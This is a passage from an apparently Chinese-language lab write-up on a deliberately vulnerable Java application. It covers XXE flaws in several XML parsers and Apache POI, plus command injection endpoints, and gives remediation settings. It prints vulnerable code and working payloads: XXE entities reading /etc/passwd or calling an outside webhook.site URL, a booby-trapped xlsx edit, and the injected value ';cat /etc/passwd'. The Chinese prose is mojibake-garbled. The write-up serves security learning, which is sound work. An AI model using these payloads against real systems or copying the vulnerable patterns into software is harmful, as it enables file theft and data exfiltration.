<h4 id="6-xxe-DocumentBuilder-vuln"><a href="#6-xxe-DocumentBuilder-vuln" class="headerlink" title="6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln"></a>6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            InputSource is = new InputSource(request.getInputStream());</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            // éå†xmlèŠ‚ç‚¹nameå’Œvalue</span><br><span class="line">            StringBuilder buf = new StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                for (int j = 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return buf.toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯JDKè‡ªå¸¦çš„ç±»ï¼Œä»¥æ­¤äº§ç”Ÿçš„XXEæ˜¯å­˜åœ¨å›æ˜¾çš„</p>
<h4 id="7-xxe-DocumentBuilder-xinclude-vuln"><a href="#7-xxe-DocumentBuilder-xinclude-vuln" class="headerlink" title="7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln"></a>7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(true);   // æ”¯æŒXInclude</span><br><span class="line">            dbf.setNamespaceAware(true);  // æ”¯æŒXInclude</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = new StringReader(body);</span><br><span class="line">            InputSource is = new InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  // parse xml</span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="8-xxe-XMLReader-vuln"><a href="#8-xxe-XMLReader-vuln" class="headerlink" title="8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln"></a>8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/XMLReader/vuln&quot;)</span><br><span class="line">    public String XMLReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;XMLReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="9-xxe-DocumentHelper-vuln"><a href="#9-xxe-DocumentHelper-vuln" class="headerlink" title="9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln"></a>9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/DocumentHelper/vuln&quot;)</span><br><span class="line">    public String DocumentHelper(HttpServletRequest req) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(req);</span><br><span class="line">            DocumentHelper.parseText(body); // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;DocumentHelper xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static void response(NodeList rootNodeList)&#123;</span><br><span class="line">        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                Node xxeNode = xxe.item(j);</span><br><span class="line">                // æµ‹è¯•ä¸èƒ½blind xxeï¼Œæ‰€ä»¥å¼ºè¡ŒåŠ äº†ä¸€ä¸ªå›æ˜¾</span><br><span class="line">                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¿®å¤è¯¥æ¼æ´åªéœ€å‡çº§dom4jåˆ°2.1.1åŠä»¥ä¸Šï¼Œè¯¥ç‰ˆæœ¬åŠä»¥ä¸Šç¦ç”¨äº†ENTITYï¼›ä¸å¸¦ENTITYçš„PoCä¸èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥ç¦ç”¨ENTITYå³å¯å®Œæˆä¿®å¤ã€‚</p>
<h4 id="ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”"><a href="#ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”" class="headerlink" title="ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”"></a>ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”</h4><table>
<thead>
<tr>
<th align="left"><strong>å·¥å…·&#x2F;ç±»</strong></th>
<th align="left"><strong>ç®€ä»‹</strong></th>
<th align="left"><strong>ä½¿ç”¨åœºæ™¯</strong></th>
<th align="left"><strong>ä¼˜ç‚¹</strong></th>
<th align="left"><strong>ç¼ºç‚¹</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>xmlReader</code></td>
<td align="left">SAX çš„æ¥å£ï¼ŒåŸºäºäº‹ä»¶é©±åŠ¨çš„è§£æ</td>
<td align="left">å¤„ç†å¤§å‹ XML æ–‡ä»¶</td>
<td align="left">å†…å­˜å ç”¨å°ï¼Œé€Ÿåº¦å¿«</td>
<td align="left">éœ€è¦æ‰‹åŠ¨ç®¡ç†ä¸Šä¸‹æ–‡ï¼Œå¤„ç†å¤æ‚ç»“æ„å›°</td>
</tr>
<tr>
<td align="left"><code>SAXBuilder</code></td>
<td align="left">JDOM ä¸­åŸºäº SAX çš„è§£æå™¨</td>
<td align="left">éœ€è¦ç”¨ JDOM å¤„ç† XML æ•°æ®æ—¶</td>
<td align="left">ç»“åˆäº† SAX çš„é«˜æ•ˆæ€§å’Œ JDOM çš„æ˜“ç”¨æ€§</td>
<td align="left">è§£æé€Ÿåº¦ä¾èµ–äº SAXï¼Œçµæ´»æ€§ä½äº DOM</td>
</tr>
<tr>
<td align="left">SAXReader&#96;</td>
<td align="left">Dom4j ä¸­åŸºäº SAX çš„è§£æå™¨</td>
<td align="left">éœ€è¦ Dom4j è¿›è¡Œ XML æ“ä½œæ—¶</td>
<td align="left">é«˜æ•ˆä¸”çµæ´»ï¼Œæ”¯æŒæ ‘ç»“æ„</td>
<td align="left">æ€§èƒ½ç•¥é€Šäºçº¯ SAX</td>
</tr>
<tr>
<td align="left"><code>SAXParser</code></td>
<td align="left">Java ä¸­çš„ SAX è§£æå™¨</td>
<td align="left">åŸºäºäº‹ä»¶é©±åŠ¨çš„è§£æï¼Œé€‚åˆå¤„ç†å¤§å‹ XML æ–‡ä»¶</td>
<td align="left">é«˜æ•ˆï¼Œå†…å­˜å ç”¨å°</td>
<td align="left">è§£æå¤æ‚ XML éœ€è¦æ‰‹åŠ¨å¤„ç†å›è°ƒ</td>
</tr>
<tr>
<td align="left">Digester&#96;</td>
<td align="left">åŸºäº SAXï¼Œå°† XML æ˜ å°„åˆ° Java å¯¹è±¡ï¼ˆApache Commons æä¾›ï¼‰</td>
<td align="left">éœ€è¦å°† XML æ˜ å°„ä¸º Java å¯¹è±¡æ—¶</td>
<td align="left">ç®€åŒ– XML ä¸ Java å¯¹è±¡çš„æ˜ å°„</td>
<td align="left">å¯¹å¤§æ–‡ä»¶ä¸å‹å¥½ï¼Œçµæ´»æ€§è¾ƒä½</td>
</tr>
<tr>
<td align="left">DocumentBuilder&#96;</td>
<td align="left">Java ä¸­ DOM è§£æå™¨ï¼Œç”¨äºæ„å»ºæ ‘çŠ¶ç»“æ„</td>
<td align="left">éœ€è¦å®Œæ•´æ ‘ç»“æ„æ“ä½œï¼Œå¦‚ä¿®æ”¹å’Œå¤šæ¬¡éå† XML æ–‡ä»¶</td>
<td align="left">å®Œæ•´ä¿ç•™æ–‡æ¡£ç»“æ„ï¼Œæ˜“äºæŸ¥æ‰¾å’Œä¿®æ”¹</td>
<td align="left">å†…å­˜å ç”¨è¾ƒå¤§ï¼Œå¤„ç†å¤§æ–‡ä»¶æ—¶æ€§èƒ½è¾ƒå·®</td>
</tr>
<tr>
<td align="left"><code>DocumentHelper</code></td>
<td align="left">Dom4j æä¾›çš„è¾…åŠ©ç±»ï¼Œç”¨äºå¿«é€Ÿåˆ›å»ºå’Œæ“ä½œ XML æ–‡æ¡£</td>
<td align="left">éœ€è¦æ‰‹åŠ¨æ„å»ºå’Œæ“ä½œ XML æ–‡æ¡£æ—¶</td>
<td align="left">å¿«é€Ÿåˆ›å»ºå’Œå¤„ç† XML æ–‡æ¡£ï¼Œçµæ´»æ€§é«˜</td>
<td align="left">å†…å­˜å ç”¨è¾ƒå¤§ï¼Œå¤„ç†è¶…å¤§æ–‡ä»¶æ—¶æ€§èƒ½ä¸ä½³</td>
</tr>
</tbody></table>
<h4 id="ç»Ÿä¸€æ¼æ´åˆ©ç”¨payload"><a href="#ç»Ÿä¸€æ¼æ´åˆ©ç”¨payload" class="headerlink" title="ç»Ÿä¸€æ¼æ´åˆ©ç”¨payload"></a>ç»Ÿä¸€æ¼æ´åˆ©ç”¨payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png" alt="image-20250728112724781" loading="lazy"></p>
<h4 id="ç»Ÿä¸€ä¿®å¤ä»£ç "><a href="#ç»Ÿä¸€ä¿®å¤ä»£ç " class="headerlink" title="ç»Ÿä¸€ä¿®å¤ä»£ç "></a>ç»Ÿä¸€ä¿®å¤ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//å®ä¾‹åŒ–è§£æç±»ä¹‹åé€šå¸¸ä¼šæ”¯æŒç€ä¸‰ä¸ªé…ç½®</span><br><span class="line">obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¦ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œé™åˆ¶å®ä½“æ¥æºã€‚</p>
<h4 id="10-xxe-xmlbeam-vuln"><a href="#10-xxe-xmlbeam-vuln" class="headerlink" title="10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln"></a>10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/xmlbeam/vuln&quot;)</span><br><span class="line">HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        logger.info(user.toString());</span><br><span class="line">        return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        return ResponseEntity.ok(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.</span><br><span class="line"> */</span><br><span class="line">@ProjectedPayload</span><br><span class="line">public interface UserPayload &#123;</span><br><span class="line">    @XBRead(&quot;//userName&quot;)</span><br><span class="line">    String getUserName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯¥ä»£ç éœ€è¦ä½¿ç”¨å›ºå®šçš„æ ‡ç­¾å¯ä»¥å®ç°å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;userPayload&gt;</span><br><span class="line">    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;</span><br><span class="line">&lt;/userPayload&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png" alt="image-20250728144316073" loading="lazy"></p>
<h4 id="11-ooxml-readxlsx"><a href="#11-ooxml-readxlsx" class="headerlink" title="11&#x2F;ooxml&#x2F;readxlsx"></a>11&#x2F;ooxml&#x2F;readxlsx</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/readxlsx&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String ooxml_xxe(MultipartFile file) throws IOException &#123;</span><br><span class="line">       XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln</span><br><span class="line"></span><br><span class="line">       XSSFSheet sheet = wb.getSheetAt(0);</span><br><span class="line">       XSSFRow row;</span><br><span class="line">       XSSFCell cell;</span><br><span class="line"></span><br><span class="line">       Iterator rows = sheet.rowIterator();</span><br><span class="line">       StringBuilder sbResult = new StringBuilder();</span><br><span class="line"></span><br><span class="line">       while (rows.hasNext()) &#123;</span><br><span class="line"></span><br><span class="line">           row = (XSSFRow) rows.next();</span><br><span class="line">           Iterator cells = row.cellIterator();</span><br><span class="line"></span><br><span class="line">           while (cells.hasNext()) &#123;</span><br><span class="line">               cell = (XSSFCell) cells.next();</span><br><span class="line"></span><br><span class="line">               if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) &#123;</span><br><span class="line">                   sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);</span><br><span class="line">               &#125; else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) &#123;</span><br><span class="line">                   sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   logger.info(&quot;errors&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return sbResult.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºç å¾—çŸ¥ä½¿ç”¨çš„æ˜¯poi-ooxmlç»„ä»¶ï¼ˆ Apache POIæ˜¯æä¾›Microsoft Officeç³»åˆ—æ–‡æ¡£è¯»ã€å†™åŠŸèƒ½çš„ JAVA ç±»åº“ï¼‰è¿›è¡Œxlsxæ–‡ä»¶æ“ä½œï¼Œåœ¨3.10ç‰ˆæœ¬åŠä»¥ä¸‹å­˜åœ¨XXEæ³¨å…¥æ¼æ´ï¼Œ3.15ä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨Dosæ¼æ´ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯3.9ç‰ˆæœ¬ã€‚</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png" alt="image-20250728114555336" loading="lazy"></p>
<p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ª1.xlsxï¼Œç”¨7-zipæ‰“å¼€è¿™ä¸ªæ–‡ä»¶çš„å‹ç¼©åŒ…</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png" alt="image-20250728141719633" loading="lazy"></p>
<p>ç„¶åä¿®æ”¹[Content_Types].xmlæ–‡ä»¶ï¼Œåœ¨æœ€ä¸Šé¢æ·»åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ELEMENT foo ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨uploadè·¯ç”±ä¸‹ä¸Šä¼ è¿™ä¸ª1.xlsxï¼Œæˆ‘ä»¬åœ¨webhookèƒ½å‘ç°è¿™ä¸ªæ–‡ä»¶æ‰§è¡ŒæˆåŠŸäº†</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png" alt="image-20250728141829969" loading="lazy"></p>
<h4 id="12-xlsx-streamer-readxlsx"><a href="#12-xlsx-streamer-readxlsx" class="headerlink" title="12.&#x2F;xlsx-streamer&#x2F;readxlsx"></a>12.&#x2F;xlsx-streamer&#x2F;readxlsx</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/readxlsx&quot;)</span><br><span class="line">   public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;</span><br><span class="line">       StreamingReader.builder().open(file.getInputStream());</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šé¢˜ç›¸æ¯”å°±æ˜¯æ¢äº†ä¸ªåº“çš„åŒºåˆ«ï¼Œpayloadä¸€æ ·çš„</p>
<h3 id="Commandinject"><a href="#Commandinject" class="headerlink" title="Commandinject"></a>Commandinject</h3><h4 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls -la &quot;</span> + filepath&#125;;</span><br><span class="line">    <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">    builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">    <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°†ä¼ å…¥çš„å‚æ•°ç›´æ¥ä¸åŸå‘½ä»¤æ‹¼æ¥ï¼Œå®ç°å‘½ä»¤æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=;cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png" alt="image-20250728143906716" loading="lazy"></p>
<h4 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/host&quot;)</span><br><span class="line">    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        String host = request.getHeader(&quot;host&quot;);</span><br><span class="line">        logger.info(host);</span><br><span class="line">        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">        ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">        builder.redirectErrorStream(true);</span><br><span class="line">        Process process = builder.start();</span><br><span class="line">        return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åŒæ ·å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‹¼æ¥ï¼Œä½†éœ€è¦å†hostå­—æ®µå¤„è¿›è¡Œä¼ å‚ï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘ä¼ ä¸ä¸Šå»ï¼Œç”¨å¤§ä½¬çš„å›¾ç‰‡ä»£æ›¿ä¸€ä¸‹ï¼‰</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png" alt="image-20250728145951030" loading="lazy"></p>
<h4 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h4><p>ä¿®å¤ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath = SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null == filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder = new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process = builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cmdFilterå‡½æ•°ä»£ç ï¼š</p>
